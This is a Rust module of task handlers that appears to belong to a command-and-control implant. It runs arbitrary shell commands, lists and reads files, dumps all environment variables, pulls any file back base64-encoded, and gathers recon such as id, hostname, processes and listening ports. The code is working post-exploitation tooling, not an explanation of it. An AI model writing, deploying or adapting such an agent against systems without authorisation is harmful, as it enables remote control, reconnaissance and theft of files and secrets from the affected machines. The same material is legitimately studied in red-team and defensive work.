use super::TaskStatus;
use base64::Engine;
use std::process::Command;

pub fn shell(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No command provided".to_string());
    }
    let cmd_str = args.join(" ");
    match Command::new("sh").arg("-c").arg(&cmd_str).output() {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stderr.is_empty() {
                if !result.is_empty() { result.push('\n'); }
                result.push_str("[stderr] ");
                result.push_str(&stderr);
            }
            if output.status.success() {
                (TaskStatus::Success, result)
            } else {
                (TaskStatus::Error, format!("exit {}: {}", output.status.code().unwrap_or(-1), result))
            }
        }
        Err(e) => (TaskStatus::Error, format!("exec failed: {e}")),
    }
}

pub fn ls(args: &[String]) -> (TaskStatus, String) {
    let path = args.first().map(|s| s.as_str()).unwrap_or(".");
    match std::fs::read_dir(path) {
        Ok(entries) => {
            let mut lines = Vec::new();
            for entry in entries.flatten() {
                let meta = entry.metadata().ok();
                let kind = meta.as_ref().map(|m| if m.is_dir() { "d" } else { "-" }).unwrap_or("?");
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                lines.push(format!("{} {:>10} {}", kind, size, entry.file_name().to_string_lossy()));
            }
            lines.sort();
            (TaskStatus::Success, lines.join("\n"))
        }
        Err(e) => (TaskStatus::Error, format!("ls {path}: {e}")),
    }
}

pub fn cat(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No path provided".to_string());
    }
    match std::fs::read_to_string(&args[0]) {
        Ok(data) => (TaskStatus::Success, data),
        Err(e) => (TaskStatus::Error, format!("{}: {e}", args[0])),
    }
}

pub fn pwd() -> (TaskStatus, String) {
    match std::env::current_dir() {
        Ok(p) => (TaskStatus::Success, p.display().to_string()),
        Err(e) => (TaskStatus::Error, e.to_string()),
    }
}

pub fn whoami() -> (TaskStatus, String) {
    shell(&["whoami".to_string()])
}

pub fn ps() -> (TaskStatus, String) {
    shell(&["ps aux".to_string()])
}

pub fn env_cmd() -> (TaskStatus, String) {
    let mut vars: Vec<String> = std::env::vars()
        .map(|(k, v)| format!("{k}={v}"))
        .collect();
    vars.sort();
    (TaskStatus::Success, vars.join("\n"))
}

pub fn download(args: &[String]) -> (TaskStatus, String) {
    if args.is_empty() {
        return (TaskStatus::Error, "No path provided".to_string());
    }
    match std::fs::read(&args[0]) {
        Ok(data) => {
            let encoded = base64::engine::general_purpose::STANDARD.encode(&data);
            (TaskStatus::Success, format!("b64:{encoded}"))
        }
        Err(e) => (TaskStatus::Error, format!("{}: {e}", args[0])),
    }
}

pub fn id() -> (TaskStatus, String) {
    shell(&["id".to_string()])
}

pub fn hostname() -> (TaskStatus, String) {
    shell(&["hostname".to_string()])
}

pub fn netstat() -> (TaskStatus, String) {
    // Try ss first (modern), fallback to netstat
    let (status, output) = shell(&["ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null".to_string()]);
    (status, output)
}
